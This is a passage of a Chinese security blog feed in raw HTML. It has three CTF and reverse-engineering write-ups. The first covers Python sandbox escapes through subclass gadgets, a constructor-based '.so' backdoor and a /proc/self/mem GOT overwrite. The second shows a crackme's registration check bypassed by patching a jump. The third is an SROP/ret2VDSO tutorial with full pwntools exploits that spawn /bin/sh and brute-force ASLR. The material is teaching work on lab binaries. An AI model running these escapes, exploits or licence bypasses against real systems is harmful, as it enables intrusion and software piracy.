&#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;]methods = [&#39;os&#39;, &#39;sys&#39;, &#39;__builtin__&#39;]results = {}for module in all_modules:    results[module] = {        &#39;flag&#39;: 0,        &#39;result&#39;: {}    }    try:        m = __import__(module)        attrs = dir(m)        for method in methods:            if method in attrs:                results[module][&#39;flag&#39;] = 1                results[module][&#39;result&#39;][method] = &#39;\033[1;31mYES\033[0m&#39;            else:                results[module][&#39;result&#39;][method] = &#39;NO&#39;    except Exception as e:        print module, efor result in results:    if results[result][&#39;flag&#39;]:        print &#39;[*]&#39;, result        for r in results[result][&#39;result&#39;]:            print &#39;\t[+]&#39;, r, &#39;=&gt;&#39;, results[result][&#39;result&#39;][r]</code></pre><h1 id="伪-private-属性和函数"><a href="#伪-private-属性和函数" class="headerlink" title="伪 private 属性和函数"></a>伪 <code>private</code> 属性和函数</h1><p>Python 中以双下划线开头的函数和属性是 <code>private</code> 的，但是这种 <code>private</code> 只是形式上的，表示这个函数不应该在本类之外的地方进行访问，而是否遵守则取决于具体的实现。公有的函数和属性，使用其名字直接进行访问；而私有的属性和函数，使用 <code>下划线+类名+函数名</code> 进行访问：</p><pre><code class="python">In [1]: class A():    ...:     __a = 1    ...:     b = 2    ...:     def __c(self):    ...:         pass    ...:     def d(self):    ...:         pass    ...:In [2]: dir(A)Out[2]: [&#39;_A__a&#39;, &#39;_A__c&#39;, &#39;__doc__&#39;, &#39;__module__&#39;, &#39;b&#39;, &#39;d&#39;]</code></pre><h1 id="构造-so-库"><a href="#构造-so-库" class="headerlink" title="构造 so 库"></a>构造 so 库</h1><p>编译一个 so 库，并写入指定的路径：</p><pre><code class="cpp">// gcc bkdoor.c -shared -fPIC -o libbkdoor.sovoid my_init() __attribute__((constructor));void my_init() {    system(&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;);}</code></pre><p>调用 ctypes 来载入 so 库：</p><pre><code class="python">In [1]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[235] =&gt; ctypes.CDLLIn [2]: # &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236] =&gt; ctypes.LibraryLoaderIn [3]: &#39;&#39;.__class__.__mro__[-1].__subclasses__()[236](&#39;&#39;.__class__.__mro__[-1].__subclasses__()[235]).LoadLibrary(&#39;/tmp/libbkdoor.so&#39;)Out[3]: &lt;CDLL &#39;/tmp/libbkdoor.so&#39;, handle 2831310 at 7ff2434184d0&gt;In [4]: __import__(&#39;os&#39;).system(&#39;cat /tmp/ls_home_ctf&#39;)total 8drwxr-xr-x 2 root root 4096 Apr  3 02:23 .drwxr-xr-x 1 root root 4096 Apr  3 02:23 ..-rw-r--r-- 1 root root    0 Apr  3 02:23 flagOut[4]: 0</code></pre><h1 id="修改-GOT-表"><a href="#修改-GOT-表" class="headerlink" title="修改 GOT 表"></a>修改 GOT 表</h1><p>类似 PWN 里的做法，可以把 <code>fopen</code> 的 GOT 改为 <code>system</code>。先用 objdump 查找：</p><pre><code class="bash">/usr/bin ❯ objdump -R python | grep -E &quot;fopen|system&quot;00000000008de2b8 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.500000000008de8c8 R_X86_64_JUMP_SLOT  fopen64@GLIBC_2.2.5</code></pre><p>一句话脚本：</p><pre><code class="python"># 0x00000000008de2b8 =&gt; system# 0x00000000008de8c8 =&gt; fopen(lambda r, w:    r.seek(0x00000000008de2b8) or    w.seek(0x00000000008de8c8) or    w.write(r.read(8)) or    ().__class__.__bases__[0].__subclasses__()[40](&#39;ls&#39;))(    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;r&#39;),    ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;, &#39;w&#39;, 0))</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SameBall.exe v1.02 注册码算法浅析</title>
    <link href="/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    <url>/2020/03/19/SameBall-exe-v1-02-%E6%B3%A8%E5%86%8C%E7%A0%81%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>老师布置的一个作业，算法其实不难，但逆向起来比较复杂，看懂了就好理解了。简单的做个记录。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>程序是一个对对碰游戏，每过一段时间，程序会检测注册表中是否有注册信息，如果没有会弹出注册窗口。</p><h1 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h1><p>先看看注册向导中会提供什么有用的信息：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/2.png" srcset="/img/loading.gif" alt></p><p>通过字符串搜索，定位到关键的几处代码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/3.png" srcset="/img/loading.gif" alt></p><p>然后单步走出这个函数，在 004063CA 处，对前面函数的结构做了一个判断，并跳有一个跳转，往下的代码，可以看出是在使用 RegSetValueA 往注册表里写东西，说明判断注册码成功后进行注册。那么只需要把这个跳转 nop 掉，或者是改成强制的 JMP 004063D0（即跳到下一条指令）即可：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/5.png" srcset="/img/loading.gif" alt></p><p>将修改保存到文件之后随便输入什么内容都能注册了。</p><h1 id="Algorithm-Analysis"><a href="#Algorithm-Analysis" class="headerlink" title="Algorithm Analysis"></a>Algorithm Analysis</h1><p>先尝试随机输入一些数据，然后根据前面的分析，可以发现在 004063B2 处进行了判断，前面的函数应该生成了注册码：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/6.png" srcset="/img/loading.gif" alt></p><p>进入 00406780 函数，通过函数将两个长为 32 的字符串转为了整型，整型的字长被记录在最低字上：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/7.png" srcset="/img/loading.gif" alt></p><p>接着在在 0040686C 处发现两个字符串以及我们输入的字符串被作为参数传入：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/8.png" srcset="/img/loading.gif" alt></p><p>进入 00406570 函数之后，在 004065C0 处先对字符串的长度判断是否小于 0x100，接着判断字符串的长度是否大于零：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/9.png" srcset="/img/loading.gif" alt></p><p>然后对字符串每个字符进行判断是否在 0 ～ F 的范围内，即是否是一个十六进制字符串：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/10.png" srcset="/img/loading.gif" alt></p><p>显然如果不是的话就会出错，所以在这里设下断点，重新输入一个十六进制数 1234 作为注册码。接着继续往下，在 0040663A 处将我们的输入字符串转成了整型：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/11.png" srcset="/img/loading.gif" alt></p><p>接着往下跟进 00401AE0 函数，其中也传入了三个数字。在 00401B39 到 00401B48 处，计算 8231FC324594496514663D91E6C19989 共有多少位：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/12.png" srcset="/img/loading.gif" alt></p><p>接着将得到的位数 0x80 减去 2，开始进入下面的一个大循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/13.png" srcset="/img/loading.gif" alt></p><p>接着在循环中多次调用了 00410630 函数，其中将我们的输入自己相乘，并将结果返回：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/14.png" srcset="/img/loading.gif" alt></p><p>然后调用了 00410A40 函数，具体的汇编个人觉得是被编译器优化过后的结果，通过推测判断可以发现这个函数的运行结果为之前的乘积模 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/15.png" srcset="/img/loading.gif" alt></p><p>接着在后面取出了 8231FC324594496514663D91E6C19989，去最高的字并右移 0x1E 位，判断最低位是否为 1，如果为 1 进行下面的一堆乘法操作；反之跳过这段内容。看到这段内容，回想起以前做 ACM 的时候接触过的快速幂算法，按比特判断是否加上对应的次方：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/16.png" srcset="/img/loading.gif" alt></p><p>如果为 0，跳转到最下面，将迭代的数字减一，并开始下一个循环：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/17.png" srcset="/img/loading.gif" alt></p><p>在接下来的循环中，如果判断相乘的数大于一个字，就会分成几个字分别和目标相乘，依次由最高字开始，每次将乘积左移 32 位后加上下一次的乘积：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/18.png" srcset="/img/loading.gif" alt></p><p>这样下来基本清楚 00401AE0 函数是将我们的输入乘上 8231FC324594496514663D91E6C19989 次方再模去 CFBCC6EC474AE5CD0F7BC8DBBA353A11 的结果，推测应该是 RSA 了。后面有一些乱七八糟的函数，调试了很多遍后没发现有什么作用。最后下断点在 00401E34 这里，最后 EAX 存储的地址即为指向 0x1234 经过上面操作的结果：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/19.png" srcset="/img/loading.gif" alt></p><p>然后在 00406570 函数的最后面 0040675F 这边停下来，发现最后将结果转成了字符串，并在 EAX 里存储了这个字符串的地址：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/20.png" srcset="/img/loading.gif" alt></p><p>最后调试的时候是将结果和 0 进行比较，这样的话注册码写 0 就行了，0 的几次方结果都是 0。测试了一下注册码写 0 的话是可以写入注册表的，但是感觉不太可能这么简单，不过前面的 RSA 算法分析应该是没有什么问题了：</p><p><img src="/pics/SameBall-exe-v1.02-注册码算法浅析/21.png" srcset="/img/loading.gif" alt></p><p>整体看下来发现动态调试确实相比静态分析能更加深入地熟悉一个程序，连续分析了两天，是一次痛苦但收获颇多的经历。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.pediy.com/thread-38901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-38901.htm</a><br><a href="https://oi-wiki.org/math/quick-pow/" target="_blank" rel="noopener">https://oi-wiki.org/math/quick-pow/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Use SROP with ret2VDSO</title>
    <link href="/2020/03/14/Use-SROP-with-ret2VDSO/"/>
    <url>/2020/03/14/Use-SROP-with-ret2VDSO/</url>
    
    <content type="html"><![CDATA[<p>用 SROP 的时候，一般情况下很难找得到 <code>syscall ; ret</code>，这时就需要在 VDSO 中找了。</p><a id="more"></a><h1 id="What-is-VDSO"><a href="#What-is-VDSO" class="headerlink" title="What is VDSO"></a>What is VDSO</h1><p>VDSO（Virtual Dynamically-linked Shared Object）是个很有意思的东西，它是虚拟的，与虚拟内存一样，在计算机中本身并不存在。因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。VDSO 将内核态的调用映射到用户态的地址空间中，可以大量减少这样的开销，同时也可以使路径更好。</p><blockquote><p>这里路径更好指的是，不需要使用传统的 <code>int 0x80</code> 来进行系统调用，不同的处理器实现了不同的快速系统调用指令（Intel 实现了 <code>sysenter</code>、<code>sysexit</code>；AMD 实现了 <code>syscall</code>、<code>sysret</code>），由此自然就会出现兼容性问题。所以 Linux 实现了 <code>vsyscall</code> 接口，在底层会根据具体的结构来进行具体操作。而 <code>vsyscall</code> 就实现在 VDSO 中。</p></blockquote><p>Linux（2.6 及以上的版本）环境下执行 <code>ldd /bin/sh</code>，会发现有个名字叫 <code>linux-vdso.so.1</code>（老点的版本是 <code>linux-gate.so.1</code>）的动态文件，而系统中却找不到它，它就是 VDSO。例如：</p><pre><code class="bash">$ ldd /bin/sh    linux-vdso.so.1 =&gt;  (0x00007ffda1746000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a4da29000)    /lib64/ld-linux-x86-64.so.2 (0x00007f9a4e01b000)</code></pre><p>不光是快速系统调用，glibc 现在也提供了 VDSO 的支持，<code>open()</code>、<code>read()</code>、<code>write()</code>、<code>gettimeofday()</code> 都可以直接用 VDSO 中的实现，使得这些调用更快，glibc 更兼容，内核新特性在不影响 glibc 的情况下也可以更快的部署。</p><h2 id="Why-ret2VDSO"><a href="#Why-ret2VDSO" class="headerlink" title="Why ret2VDSO?"></a>Why ret2VDSO?</h2><p>在 x86 系统中，传统的系统调用 <code>int 0x80</code> 并没有很好的效果，因此在 Intel 新型的 CPU 提供了新的系统调用指令（2.6 及以上的版本支持新型系统调用机制）：</p><ul><li><code>sysenter</code></li><li><code>sysexit</code></li></ul><p>VDSO 可以降低在传统的 <code>int 0x80</code> 的额外开销以及提供了 <code>sigreturn</code> 可以使用 SROP。</p><p>其中 vsyscall 固定地址中存在 <code>syscall ; ret</code>：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xffffffffff600000   0xffffffffff600000:    mov    rax,0x60   0xffffffffff600007:    syscall   0xffffffffff600009:    ret</code></pre><p>可以写一个程序做一个系统调用的测试：</p><pre><code class="cpp">#include &lt;time.h&gt;#include &lt;stdio.h&gt;typedef time_t (*time_func)(time_t *);int main(int argc, char *argv[]) {    time_t tloc;    int retval = 0;    time_func func = (time_func) 0xffffffffff600000;    retval = func(&amp;tloc);    if (retval &lt; 0) {        perror(&quot;time_func&quot;);        return -1;    }    printf(&quot;%ld\n&quot;, tloc);    return 0;}</code></pre><p>总而言之，就是在 VDSO 中存在 <code>syscall ; ret</code> 可以被 SROP 利用。</p><h2 id="How-ret2VDSO"><a href="#How-ret2VDSO" class="headerlink" title="How ret2VDSO?"></a>How ret2VDSO?</h2><p><code>sysenter</code> 其参数传递方式和 <code>int 0x80</code> 是一样的，但是需要先做好 Function Prologue：</p><pre><code class="asm">push ebp ; mov ebp, esp</code></pre><p>以及需要找到一个好的 Gadget 来做 Stack Pivot。</p><h2 id="ret2VDSO-Theory"><a href="#ret2VDSO-Theory" class="headerlink" title="ret2VDSO Theory"></a>ret2VDSO Theory</h2><p>获取 VDSO 的方法：</p><ol><li>暴力破解</li><li>通过泄漏<ul><li>使用 ld.so 中的 <code>_libc_stack_end</code> 找到 stack 其实位置，计算 ELF Auxiliary Vector Offset 并从中取出 <code>AT_SYSINFO_EHDR</code>；</li><li>使用 ld.so 中的 <code>_rtld_global_ro</code> 的某个 Offset 也有 VDSO 的位置。</li><li>尤其注意的是在开了 ASLR 的情况下，VDSO 的利用是有一定优势的<ul><li>在 x86 环境下：只有一个字节是随机的，所以我们可以很容易暴力解决；</li><li>在 x64 环境下：在开启了 PIE 的情形下，有 11 字节是随机的，例如：CVE-2014-9585。但是在 Linux 3.182.2 版本之后，这个已经增加到了 18 个字节的随机</li></ul></li></ul></li></ol><p>查看存储 VDSO 的地址：</p><pre><code class="gdb">assassinq&gt;&gt; p &amp;_rtld_global_ro._dl_sysinfo_dso$1 = (const Elf32_Ehdr **) 0xf7ffced4 &lt;_rtld_global_ro+468&gt;</code></pre><p>查看 VDSO 的地址（直接 vmmap 也行）：</p><pre><code class="gdb">assassinq&gt;&gt; p _rtld_global_ro._dl_sysinfo_dso$2 = (const Elf32_Ehdr *) 0xf7fd8000</code></pre><p>通过 ELF Auxiliary Vector Offset 计算出 VDSO 的地址（泄露相应的栈上的值）：</p><pre><code class="gdb">assassinq&gt;&gt; info auxv32   AT_SYSINFO           Special system info/entry points 0xf7fd8b5033   AT_SYSINFO_EHDR      System-supplied DSO&#39;s ELF header 0xf7fd8000 &lt;--- Address of VDSO16   AT_HWCAP             Machine-dependent CPU capability hints 0x9f8bfbff6    AT_PAGESZ            System page size               409617   AT_CLKTCK            Frequency of times()           1003    AT_PHDR              Program headers for program    0x80480344    AT_PHENT             Size of program header entry   325    AT_PHNUM             Number of program headers      97    AT_BASE              Base address of interpreter    0xf7fd90008    AT_FLAGS             Flags                          0x09    AT_ENTRY             Entry point of program         0x804834011   AT_UID               Real user ID                   012   AT_EUID              Effective user ID              013   AT_GID               Real group ID                  014   AT_EGID              Effective group ID             023   AT_SECURE            Boolean, was exec setuid-like? 025   AT_RANDOM            Address of 16 random bytes     0xffffd8cb31   AT_EXECFN            File name of executable        0xffffdfd8 &quot;/root/tmp/ret2VDSO_Example/main&quot;15   AT_PLATFORM          String identifying platform    0xffffd8db &quot;i686&quot;0    AT_NULL              End of vector                  0x0</code></pre><p>事实证明 VDSO 也没有非常随机，可以做一个测试：</p><pre><code class="bash">$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ffff7bb5000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77eb000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007ffff757b000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7377000)    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ffff715a000)$ while true; do ldd /bin/ls; done | grep 0x00007ffff7ffa000    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)    ...</code></pre><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>32 位下对 VDSO 进行爆破。程序如下，读入 0x400 的字节，足够塞一个构造的 sigcontext 了：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[10] = &quot;/bin/sh\x00&quot;;void pwnme() {    char s[0x100];    char *welcome = &quot;&gt; &quot;;    write(1, welcome, 2);    read(0, s, 0x400);}int main() {    pwnme();    return 0;}</code></pre><p>同时，我们在 VDSO 中可以找到 sigreturn 所对应的调用：</p><pre><code class="gdb">assassinq&gt;&gt; x/3i 0xf7fd8b71   0xf7fd8b71 &lt;__kernel_sigreturn+1&gt;:    mov    eax,0x77   0xf7fd8b76 &lt;__kernel_sigreturn+6&gt;:    int    0x80   0xf7fd8b78 &lt;__kernel_sigreturn+8&gt;:    nop</code></pre><p>关闭 ASLR 对 ret2VDSO 进行测试：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]context.arch = &#39;i386&#39;bin_sh_addr = 0x804a020bss_addr = 0x804a030p = process(&#39;./main&#39;)#gdb.attach(p)vdso_addr = 0xf7fd8000print &#39;Try vdso %s&#39; % hex(vdso_addr)payload = &#39;A&#39; * 0x110frame = SigreturnFrame(kernel=&quot;i386&quot;)frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil(&#39;&gt; &#39;)p.sendline(payload)p.sendline(&#39;echo pwned&#39;)data = p.recvuntil(&#39;pwned&#39;)if data != &#39;pwned&#39;:    raise Exception, &#39;Failed&#39;p.interactive()</code></pre><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce():    global p    context.arch = &#39;i386&#39;    p = process(&#39;./main&#39;)    global vdso_addr    vdso_addr = random.choice(vdso_range)    print &#39;Try vdso %s&#39; % hex(vdso_addr)    payload = &#39;A&#39; * 0x110    frame = SigreturnFrame(kernel=&quot;i386&quot;)    frame.eax = constants.SYS_execve    frame.ebx = bin_sh_addr    frame.eip = vdso_addr + 0xb76 # address of int 0x80    frame.esp = bss_addr    frame.ebp = bss_addr    frame.gs = 0x63    frame.cs = 0x23    frame.es = 0x2b    frame.ds = 0x2b    frame.ss = 0x2b    ret_addr = vdso_addr + 0xb71 # address of sigreturn    payload += p32(ret_addr) + str(frame)    p.recvuntil(&#39;&gt; &#39;)    p.send(payload)    p.sendline(&#39;echo pwned&#39;)    data = p.recvuntil(&#39;pwned&#39;)    if data != &#39;pwned&#39;:        info(&#39;Failed&#39;)    returnif __name__ == &#39;__main__&#39;:    global p, vdso_addr    i = 1    while True:        print &#39;Try %d&#39; % i        try:            bruteforce()        except Exception as e:            info(&#39;Wrong VDSO&#39;)            p.close()            i += 1            continue        info(&#39;vdso_addr = &#39; + hex(vdso_addr))        break    p.interactive()</code></pre><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><pre><code class="nasm">section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret</code></pre><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = &#39;/bin/sh\x00&#39;payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += &#39;A&#39; * 8payload += p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)payload = &#39;A&#39;raw_input(&#39;@&#39;)p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8):    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(&quot;vdso_addr = &quot; + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(&quot;bin_sh_addr = &quot; + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_addrpayload = &#39;A&#39; * 8 + p64(set_sigreturn) + p64(syscall_ret) + 